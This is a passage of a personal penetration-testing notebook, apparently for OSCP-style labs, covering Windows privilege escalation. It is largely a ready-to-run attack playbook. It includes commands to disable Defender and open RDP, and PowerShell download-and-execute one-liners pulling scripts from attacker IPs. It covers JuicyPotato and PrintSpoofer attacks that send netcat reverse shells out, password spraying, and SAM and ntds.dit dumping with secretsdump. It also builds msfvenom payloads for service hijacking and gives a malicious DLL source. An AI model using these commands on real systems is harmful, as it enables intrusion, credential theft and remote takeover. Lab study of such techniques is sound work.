restarts machine. This can be quite useful for startup processes to trigger:</span></p><p>shutdown /r /t 0</p><p></p><p><h3>Firewall</h3></p><p><a href="https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#firewall">https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#firewall</a></p><p><span style="color:#3f4043;">Open RDP:</span></p><p>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><p>netsh firewall add portopening TCP 3389 &quot;Remote Desktop&quot;</p><p></p><p></p><p><h3>System Information</h3></p><p></p><p>systeminfo</p><p></p><p>hostname <span style="color:#404040;">(might give you a clue as to what this machine&#39;s role is in the enterprise)</span></p><p></p><p><h3>Searching</h3><h3> </h3><h3>Files</h3></p><p><span style="color:#404040;">(</span><span style="color:#404040;background-color:#7f7f7f;">findstr</span><span style="color:#404040;"> searches for patterns of text in files. </span><code><span style="color:#404040;">/si</span></code><span style="color:#404040;">: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i))</span></p><p>findstr /si password *.txt  </p><p><span style="color:#3f4043;">(powershell, looks across entire c drive to find all filenames that matches specified string)</span></p><p>get-childitem c:\ -recurse -erroraction silentlycontinue | where-object {$_.Name -match &quot;Veeam.one&quot;} </p><p><span style="color:#3f4043;">(gives lot of info about file, including exact version)</span></p><p>get-childitem &quot;C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Deployment.Service.exe&quot; | format-list *  </p><p></p><p><h3>Patch Level</h3></p><p></p><p>wmic qfe get Caption,Description,HotFixID,InstalledOn <span style="color:#404040;">(This command can be used to list updates installed on the target system.)</span></p><p></p><p><h3>Network Connections</h3></p><p></p><p>netstat -ano</p><p>get-process -Id 4916 <span style="color:#3f4043;">(powershell, but will give you more info on that ID of the process running on a certain port. Can be quite useful)</span></p><p></p><p><h3>Scheduled Tasks</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3>schtasks<h3></h3></p><p><h3></h3>schtasks /query /fo LIST /v <span style="color:#404040;">(The schtasks command can be used to query scheduled tasks.)</span></p><p>schtasks | findstr /si soon </p><p>schtasks /delete /tn soon /F</p><p></p><p><h3></h3></p><p><h3></h3><h3>Drivers</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3>driverquery <span style="color:#404040;">(will list drivers installed on the target system.)</span><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><h3>Antivirus</h3></p><p>sc query windefend <span style="color:#404040;">(simple check if defender is present and it&#39;s status)</span></p><p>wmic service get name,displayname,pathname,startmode | findstr &quot;Defender&quot;</p><p></p><p><span style="color:#3f4043;">Disable anti virus real time detection: (needs administrator session)</span></p><p>powershell -ep bypass -c Set-MpPreference -DisableRealtimeMonitoring $true</p><p></p><p><h3>Services</h3><h3> </h3></p><p></p><p>wmic service list brief | findstr  &quot;Running&quot;</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Tools_236.html"></a><h1 class='title level-5'>Tools</h1><br/><p><h2>Tools:</h2></p><p>wget <a href="https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py">https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py</a></p><p></p><p><span style="color:#3f4043;">If issues with this python script, use the virtualenv environment in ~/virtEnv1/. So cd into ~/virtEnv1/</span>, <span style="color:#3f4043;">then</span> source bin/activate</p><p><span style="color:#3f4043;">If issues with xlrd, do this</span> <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/50">https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/50</a></p><p><span style="color:#3f4043;">If issues with xlsx with script after changes above, do this </span><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/48">https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/48</a></p><p>==</p><p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></p><p>==</p><p><a href="https://github.com/PowerShellMafia/PowerSploit.git">https://github.com/PowerShellMafia/PowerSploit.git</a></p><p></p><p><span style="color:#234141;">These are all great. Use them. </span></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Tools--windows-exploit-suggester.py_237.html"></a><h1 class='title level-6'>windows-exploit-suggester.py</h1><br/><p>wget <a href="https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py">https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py</a></p><p></p><p><span style="color:#3f4043;">If issues with this python script, use the virtualenv environment in ~/virtEnv1/. So cd into ~/virtEnv1/</span>, <span style="color:#3f4043;">then</span> source bin/activate</p><p><span style="color:#3f4043;">If issues with xlrd, do this</span> <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/50">https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/50</a></p><p><span style="color:#3f4043;">If issues with xlsx with script after changes above, do this </span><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/48">https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/48</a></p><p></p><p>On windows host: systeminfo</p><p>Take that file and store it locally as systeminfo.txt</p><p></p><p><span style="color:#3f4043;">Then run:</span></p><p>python3 windows-exploit-suggester.py --update</p><p>python3 windows-exploit-suggester.py -d 2022-04-17-mssb.xls -i systeminfo.txt -l             <span style="color:#3f4043;">(This uses the database file we created and finds all the exploits it can for the the machine with regard to local exploits.)</span></p><p></p><p><span style="color:#3f4043;">If the script in /opt/windows-exploit-suggester doesnt work, just run it in venv like so:</span></p><p>source ~/virtEnv1/bin/activate </p><p><span style="color:#3f4043;">then run it it again</span></p><p>python3 windows-exploit-suggester.py -d 2022-04-17-mssb.xls -i systeminfo.txt -l</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Tools--wesng.py_238.html"></a><h1 class='title level-6'>wesng.py</h1><br/><p>git clone <a href="https://github.com/bitsadmin/wesng.git">https://github.com/bitsadmin/wesng.git</a></p><p></p><p>python3 wes.py --update</p><p></p><p>pip3 install mechanicalsoup   <span style="color:#3f4043;">(this is needed for the --muc-lookup feature. Basically further validation to mitigate false positives)</span></p><p></p><p></p><p></p><p><span style="color:#3f4043;">Quick check for privesc:</span></p><p>python3 wes.py systeminfo.txt -e -i &quot;Elevation of Privilege&quot; | tee wesng.txt</p><p></p><p><span style="color:#3f4043;">Only ones with critical tag:</span></p><p>python3 wes.py systeminfo.txt -e -i &quot;Elevation of Privilege&quot; -s critical | tee wesng.txt</p><p></p><p><span style="color:#3f4043;">Only ones with critical tag and does checkup to minimize false positives (takes longer)</span></p><p>python3 wes.py systeminfo.txt -e -i &quot;Elevation of Privilege&quot; -s critical --muc-lookup | tee wesng.txt</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Tools--PowerUp.ps1_245.html"></a><h1 class='title level-6'>PowerUp.ps1</h1><br/><p></p><p><a href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1</a></p><p></p><p></p><p><span style="color:#3f4043;">Execution policy bypass, runs PowerUp.ps1 and does the Invoke-AllCheck functionality against target system all in memory:</span></p><p>powershell.exe -nop -ep bypass IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://192.168.119.157/PowerUp.ps1');Invoke-AllChecks">http://192.168.119.228/PowerUp.ps1&#39;);Invoke-AllChecks</a></p><p>powershell.exe -nop -ep bypass IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://192.168.119.157/PowerUp.ps1');Invoke-AllChecks">http://10.8.24.10/PowerUp.ps1&#39;);Invoke-AllChecks</a></p><p></p><p><span style="color:#3f4043;">Invoking script from powershell:</span></p><p>powershell -ep bypass</p><p> . .\PowerUp.ps1</p><p></p><p><span style="color:#3f4043;">Invoking script from smb share:</span></p><p>powershell -ep bypass . \\TSCLIENT\share\PowerUp.ps1;Invoke-AllChecks</p><p></p><p><span style="color:#3f4043;">Useful commands(must be ran from powershell):</span></p><p>Invoke-AllChecks</p><p>Invoke-AllChecks &gt; up.log</p><p>Get-Help Invoke-ServiceAbuse -Examples</p><p></p><p><span style="color:#3f4043;">From cmd and saves output in up.log:</span></p><p>powershell -nop -ep bypass . .\PowerUp.ps1;Invoke-AllChecks &gt; up.log</p><p></p><p>Automation tools for PrivEsc:</p><p></p><p><span style="color:#3f4043;">Execution policy bypass, runs PowerUp.ps1 and does the Invoke-AllCheck functionality against target system all in memory:</span></p><p>powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1</a><a href="http://192.168.119.157/PowerUp.ps1');Invoke-AllChecks">&#39;);Invoke-AllChecks</a></p><p></p><p>certutil -urlcache -split -f <a href="https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/winPEAS.bat">https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/winPEAS.bat</a></p><p>.\winPEAS.bat </p><p></p><p>powershell -nop -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1">https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1</a><a href="http://192.168.119.157/Sherlock.ps1');Find-AllVulns">&#39;);Find-AllVulns</a></p><p></p><p></p><p>powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1</a><a href="http://192.168.119.157/PowerUp.ps1');Invoke-AllChecks">&#39;);Invoke-AllChecks</a></p><p></p><p>powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">http://10.8.24.10/PowerUp.ps1</a><a href="http://192.168.119.157/PowerUp.ps1');Invoke-AllChecks">&#39;);Invoke-AllChecks</a> &gt; powerup.log</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Tools--PrivescCheck.ps1_246.html"></a><h1 class='title level-6'>PrivescCheck.ps1</h1><br/><p><a href="https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1">https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1</a></p><p></p><p><span style="color:#3f4043;">Normal:</span></p><p>powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://192.168.119.157/PrivescCheck.ps1');Invoke-PrivescCheck">http://192.168.119.228/PrivescCheck.ps1&#39;);Invoke-PrivescCheck</a></p><p></p><p><span style="color:#3f4043;">Extended:</span></p><p>powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://192.168.119.157/PrivescCheck.ps1');Invoke-PrivescCheck">http://192.168.119.157/PrivescCheck.ps1&#39;);Invoke-PrivescCheck</a> -Extended</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Tools--crackmapexec_189.html"></a><h1 class='title level-6'>crackmapexec</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Tools--crackmapexec--Password_stuffing_190.html"></a><h1 class='title level-7'>Password stuffing</h1><br/><p><a href="https://ptestmethod.readthedocs.io/en/latest/cme.html">https://ptestmethod.readthedocs.io/en/latest/cme.html</a></p><p></p><p><span style="color:#234141;">Takes a list of known usernames in domain, and tries 1, to maybe max 3 passwords on those accounts</span></p><p>crackmapexec smb 10.10.22.174 -u users_excel -p passwords</p><p></p><p><img src="images/190-1.png" alt="images/190-1.png" /></p><p></p><p><span style="color:#234141;">Sometimes you get output like this, so even if none of these were correct passwords, the info about sbradley is still incredible valuable. It indicates the password we&#39;re spraying is what sbradley currently have, but they are suggested to change the password from their current one. Can be several reasons as to why this is. It could be they haven&#39;t changed their default, for instance. </span></p><p></p><p><span style="color:#234141;">Anyhow, we can use smbpasswd to change their password and access their smb shares with the new password we make. </span></p><p></p><p>smbpasswd -r 10.10.111.50 -U sbradley</p><p><span style="color:#234141;">enter old password, and create new one. </span></p><p></p><p>smbclient -U sbradley //10.10.219.38/share</p><p></p><p>:<span style="color:#234141;">D</span></p><p></p><p></p><p>crackmapexec smb xor_targetlist.txt -u validusers.txt -H allxorhashes.txt | tee cme_xor_smb.txt</p><p></p><p>crackmapexec winrm xor_targetlist.txt -u validusers.txt -H allxorhashes.txt | tee cme_xor_winrm.txt</p><p></p><p></p><p><span style="color:#3f4043;">Find the correct accounts: </span></p><p>cat cme_xor_smb.txt | grep -b &#39;+&#39;</p><p><img src="images/190-2.png" alt="images/190-2.png" /></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Tools--crackmapexec--rid_brute_191.html"></a><h1 class='title level-7'>rid brute</h1><br/><p><span style="color:#234141;">After getting your first credentials on the domain, this will brute force sid and rid to optain initial user and group information. </span></p><p>crackmapexec smb 10.10.253.194 -u &#39;twilliams&#39; -p &#39;roastpotatoes&#39; --rid-brute | tee crackmapexec-rid-brute</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Tools--Sherlock.ps1_239.html"></a><h1 class='title level-6'>Sherlock.ps1</h1><br/><p><a href="https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1">https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1</a></p><p></p><p><span style="color:#3f4043;">Add</span> Find-AllVulns <span style="color:#3f4043;">at the very bottom of the script like so</span> <a href="https://youtu.be/kWTnVBIpNsE?t=836">https://youtu.be/kWTnVBIpNsE?t=836</a></p><p></p><p><span style="color:#3f4043;">You may call out to our webserver and trigger the script like so:</span></p><p></p><p>IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://192.168.119.148:80/Sherlock.ps1')">http://192.168.119.148/Sherlock.ps1&#39;)</a></p><p>or</p><p>IEX(iwr -usebasicparsing <a href="http://192.168.119.148:81/Sherlock.ps1)">http://192.168.119.148/Sherlock.ps1)</a></p><p></p><p></p><p><a href="https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1">https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1</a></p><p>powershell -nop -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://192.168.119.157/Sherlock.ps1');Find-AllVulns">http://192.168.119.228/Sherlock.ps1&#39;);Find-AllVulns</a>&quot;</p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks_100.html"></a><h1 class='title level-5'>Attacks</h1><br/><p>whoami /priv</p><p></p><p>Check winpeas and windows exploit suggester if needed.</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Public_Exploits_363.html"></a><h1 class='title level-6'>Public Exploits</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Public_Exploits--MS16-075__Tater.ps1_364.html"></a><h1 class='title level-7'>MS16-075 | Tater.ps1</h1><br/><p><a href="https://github.com/Kevin-Robertson/Tater">https://github.com/Kevin-Robertson/Tater</a></p><p></p><p>. ./Tater.ps1</p><p></p><p>Invoke-Tater -Trigger 1 -Command &quot;net user tater Winter2016 /add &amp;&amp; net localgroup administrators tater /add&quot;</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Public_Exploits--MS15-051__Taihou.exe_365.html"></a><h1 class='title level-7'>MS15-051 | Taihou.exe</h1><br/><p>wget <a href="https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe">https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</a></p><p></p><p>.\Taihou64.exe</p><p></p><p>(will create new administrator cmd window, so will need RDP session)</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Privileges_&_groups_276.html"></a><h1 class='title level-6'>Privileges & groups</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Privileges_&_groups--SeImpersonatePrivilege_277.html"></a><h1 class='title level-7'>SeImpersonatePrivilege</h1><br/><p></p><p><h2>JuicyPotato:</h2></p><p><span style="color:#3f4043;">(check</span> <a href="#dology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Privileges_&_groups--SeImpersonatePrivilege--JuicyPotato_217.html">JuicyPotato</a> <span style="color:#3f4043;">node for more info)</span></p><p>wget <a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</a></p><p></p></div><div class='page'><a name="dology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Privileges_&_groups--SeImpersonatePrivilege--JuicyPotato_217.html"></a><h1 class='title level-8'>JuicyPotato</h1><br/><p><span style="color:#3f4043;">With this privilege we should try this attack: (Keep in mind machine architecture)</span></p><p></p><p><h2>JuicyPotato:</h2></p><p><a href="https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505">https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505</a></p><p><span style="color:#3f4043;">Useful reference video of attack:</span> <a href="https://youtu.be/dXotJLV6jj4?t=1848">https://youtu.be/dXotJLV6jj4?t=1848</a></p><p></p><p><img src="images/217-1.png" alt="images/217-1.png" /></p><p></p><p><span style="color:#3f4043;">I saw I was part of the SeImpersonatePrivilege group so I instantly think of the juicypotato attack.</span></p><p></p><p><span style="color:#3f4043;">JuicyPotato.exe:</span></p><p><a href="https://github.com/ohpe/juicy-potato/releases">https://github.com/ohpe/juicy-potato/releases</a></p><p><span style="color:#3f4043;">Run systeminfo on box and then find the proper CLSID from here: </span></p><p><a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/">https://github.com/ohpe/juicy-potato/tree/master/CLSID/</a></p><p></p><p>gedit shell.bat</p><p><img src="images/217-2.png" alt="images/217-2.png" /></p><p>gedit rev3.ps1</p><p>(contains nishang script)</p><p></p><p>certutil -urlcache -split -f <a href="http://192.168.119.194/JuicyPotato.exe">http://192.168.119.194/JuicyPotato.exe</a></p><p>certutil -urlcache -split -f <a href="http://192.168.119.194/shell.bat">http://192.168.119.194/shell.bat</a></p><p></p><p>rlwrap nc -lvnp 444</p><p></p><p>.\JuicyPotato.exe -t * -p shell.bat -l 444 -c &quot;{03ca98d6-ff5d-49b8-abc6-03dd84127020}&quot; 444</p><p></p><p><span style="color:#3f4043;">In this case we&#39;re using JuicyPotato to run shell.bat which contains a powershell script which reaches and runs a nishang reverse shell on our webserver.</span></p><p></p><p></p><p><img src="images/217-3.png" alt="images/217-3.png" /></p><p></p><p></p><p></p><p><span style="color:#3f4043;">Here&#39;s the shell.bat basic script:</span></p><p>powershell -c IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://192.168.119.194/rev3.ps1')">http://192.168.119.194/rev3.ps1&#39;)</a></p><p></p><p><span style="color:#3f4043;">The last reverse shell through JuicyPotato.exe could be found here is this:</span></p><p>~/OSCP/Learning_Path/Disco_LP4/rev3.ps1</p><p></p></div><div class='page'><a name="ology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Privileges_&_groups--SeImpersonatePrivilege--PrintSpoofer_313.html"></a><h1 class='title level-8'>PrintSpoofer</h1><br/><p><span style="color:#3f4043;">With this privilege we should try this attack: (Keep in mind machine architecture)</span></p><p></p><p><h2>Printspoofer:</h2></p><p>wget <a href="https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe">https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe</a></p><p><span style="color:#3f4043;">If you have interactive shell:</span></p><p>.\PrintSpoofer64.exe -i -c cmd</p><p><img src="images/313-1.png" alt="images/313-1.png" /></p><p><span style="color:#3f4043;">if you don&#39;t, then try:</span></p><p>.\PrintSpoofer64.exe -c &quot;c:\Tasks\nc.exe 192.168.119.199 443 -e cmd&quot;</p><p><img src="images/313-2.png" alt="images/313-2.png" /></p><p></p><p>.\PrintSpoofer64.exe -c &quot;c:\Tasks\nc.exe 10.8.24.10 443 -e cmd&quot;</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Privileges_&_groups--SeBackupPrivilege_197.html"></a><h1 class='title level-7'>SeBackupPrivilege</h1><br/><p><a href="https://infosecwriteups.com/razorblack-walkthrough-thm-fde0790c182f">https://infosecwriteups.com/razorblack-walkthrough-thm-fde0790c182f</a></p><p></p><p><span style="color:#234141;">If machine has SeBackupPrivilege and SeRestorePrivilegeSe you can perform this attack. </span></p><p></p><p><span style="color:#234141;">Just follow instructions in link. You&#39;re practically abusing these rights you have on machine, and taking a backup of an entire drive and recreating a new drive. This new drive, you&#39;ll have more access, and we use this access to eventually get the ntds.dit and system.hive files preferably onto our local machine using something like win-rm. From here we can attempt to crack the hashes, or using pass-the-hash attacks etc. This is clearly a very dangerous right to give. </span></p><p></p><p></p><p></p><p>-----</p><p></p><p></p><p><a href="https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/linux/fusion-corp">https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/linux/fusion-corp</a></p><p></p><p>iwr -uri <a href="http://10.13.31.108/viper.dsh">http://10.13.31.108/viper.dsh</a> -o viper.dsh</p><p>diskshadow /s viper.dsh</p><p>robocopy /b x:\windows\ntds . ntds.dit</p><p>reg save hklm\system c:\windows\temp\system</p><p></p><p><span style="color:#3f4043;">(download them to ur kali)</span></p><p>secretsdump.py -ntds ntds.dit -system system local </p><p></p><p>-----</p><p><span style="color:#3f4043;">Prefer this method:</span></p><p></p><p>cd c:\ </p><p>mkdir temp </p><p>cd temp</p><p>reg save hklm\sam c:\Temp\sam </p><p>reg save hklm\system c:\Temp\system</p><p>copy sam,system \\TSCLIENT\share\</p><p><img src="images/197-1.png" alt="images/197-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Service_Attacks_295.html"></a><h1 class='title level-6'>Service Attacks</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Service_Attacks--Insecure_Service_Permissions_296.html"></a><h1 class='title level-7'>Insecure Service Permissions</h1><br/><p><span style="color:#3f4043;">From powerup Invoke-AllChecks:</span></p><p><img src="images/296-1.png" alt="images/296-1.png" /></p><p></p><p>accesschk64.exe /accepteula -uwqvc daclsvc</p><p><img src="images/296-2.png" alt="images/296-2.png" /></p><p></p><p><span style="color:#3f4043;">As you can see, we practically have full control over this service as just a normal user.</span> </p><p><span style="color:#3f4043;">We will be abusing the “SERVICE_CHANGE_CONFIG” in particular to change the service executable location to our own payload.</span></p><p></p><p><span style="color:#3f4043;">Let&#39;s modify the path of the executable the service depends on to run.. to our own payload in a different binpath.</span></p><p></p><p>sc.exe config daclsvc binpath= &quot;\&quot;C:\Users\user\jaja\reverse.exe\&quot;&quot;</p><p></p><p>sc.exe config daclsvc binpath= &quot;C:\Users\user\jaja\reverse.exe&quot;</p><p><img src="images/296-3.png" alt="images/296-3.png" /></p><p></p><p><img src="images/296-4.png" alt="images/296-4.png" /></p><p></p><p>And we get a system shell!</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Service_Attacks--Insecure_Service_Executables_294.html"></a><h1 class='title level-7'>Insecure Service Executables</h1><br/><p><span style="color:#3f4043;">From powerup Invoke-AllChecks:</span></p><p></p><p><img src="images/294-1.png" alt="images/294-1.png" /></p><p></p><p><span style="color:#3f4043;">System running, and it seems we can abuse the service file, or the filepermservice.exe in this case.</span></p><p></p><p>accesschk64.exe /accepteula -uwqv &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</p><p></p><p>Get-Acl -Path &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot; | fl</p><p></p><p>move &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot; &quot;C:\Program Files\File Permissions Service\filepermservice.exe.bak&quot;</p><p><img src="images/294-2.png" alt="images/294-2.png" /></p><p></p><p><span style="color:#3f4043;">We can indeed do whatever we want with this exectuable, but if we just make a reverse shell and run it, we will still be in same user context. So we need to have the filepermsvc trigger it for us.</span></p><p></p><p><span style="color:#3f4043;">Let&#39;s inspect it&#39;s corresponding service details and see just what we can do with this information:</span> <span style="color:#3f4043;">(It&#39;s worth noting that sometimes it says auto start which means it starts up at reboot. So, if we can reset machine, we don&#39;t need the start service permission to trigger the service executable)</span></p><p><img src="images/294-3.png" alt="images/294-3.png" /></p><p></p><p><span style="color:#3f4043;">It seems we can stop and start this service too! That should be all we need for a privesc then! Let&#39;s create our payload.</span></p><p></p><p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.31.108 LPORT=443 -f exe -o reverse.exe</p><p></p><p><span style="color:#3f4043;">Next, we take our payload and place it over the service executable since we have the permissions needed:</span></p><p>copy reverse.exe &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</p><p></p><p><span style="color:#3f4043;">next, setup listener:</span></p><p>rlwrap -lvnp 443</p><p></p><p><span style="color:#3f4043;">then, start service to trigger shell:</span></p><p>net start filepermsvc</p><p><span style="color:#3f4043;">or</span></p><p>sq.exe start filepermsvc</p><p></p><p><img src="images/294-4.png" alt="images/294-4.png" /></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Service_Attacks--Unqouted_Service_Path_102.html"></a><h1 class='title level-7'>Unqouted Service Path</h1><br/><p><span style="color:#3f4043;">Find unquoted service path:</span></p><p>. .\PowerView.ps1;Invoke-AllChecks</p><p>.\winPEASany.exe</p><p><span style="color:#3f4043;">or</span></p><p>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</p><p></p><p><span style="color:#3f4043;">Gives information on service related to the executable file in the unquoted path:</span></p><p>sc.exe qc unquotedsvc</p><p></p><p><span style="color:#3f4043;">List permissions of the directory</span></p><p>.\accesschk64.exe /accepteula -uwqd &quot;C:\Program Files\Unquoted Path Service\&quot;</p><p></p><p><span style="color:#3f4043;">Check if you can start and stop the service:</span></p><p>sc.exe start unquotedsvc</p><p>sc.exe stop unquotedsvc</p><p></p><p><span style="color:#3f4043;">and here we can just create a simple reverse shell as we have a very clear threat surface</span></p><p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.3.155 LPORT=443 -f exe &gt; common.exe</p><p></p><p><span style="color:#3f4043;">Next, place the executable in a writeable folder in the unquoted path. Windows will read yours before the original executable due to how windows handles parsing data in an unqouted context. </span></p><p>copy C:\users\user\jaja\reverse.exe &quot;C:\Program Files\Unquoted Path Service\Common.exe&quot;</p><p></p><p>rlwrap -lvnp 443</p><p></p><p>sc.exe query unquotedsvc</p><p>sc.exe start unquotedsvc</p><p></p><p><span style="color:#404040;">next if everything went accordingly, an nt authority\system shell is waiting for you :)</span></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Methodology--Attacks--Service_Attacks--dll_hijacking_101.html"></a><h1 class='title level-7'>dll hijacking</h1><br/><p><a href="https://steflan-security.com/windows-privilege-escalation-dll-hijacking/">https://steflan-security.com/windows-privilege-escalation-dll-hijacking/</a></p><p></p><p><span style="color:#ff0000;">#include &lt;windows.h&gt;</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;"></span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">    if (dwReason == DLL_PROCESS_ATTACH) {</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">        system(&quot;cmd.exe /k net user jack Password11&quot;);</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">        ExitProcess(0);</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">    }</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">    return TRUE;</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">}</span></p><p></p><p><span style="color:#404040;">Super basic example of a c file we start off with. Here we basically just change the password of jack.</span> </p><p></p><p>x86_64-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll <span style="color:#404040;">(here we&#39;re cross compiling our c program from kali to a dll file we&#39;ll be using on the windows victim machine)</span></p><p></p><p></p><p><span style="color:#404040;">(prob easier alternative) reverse tcp using 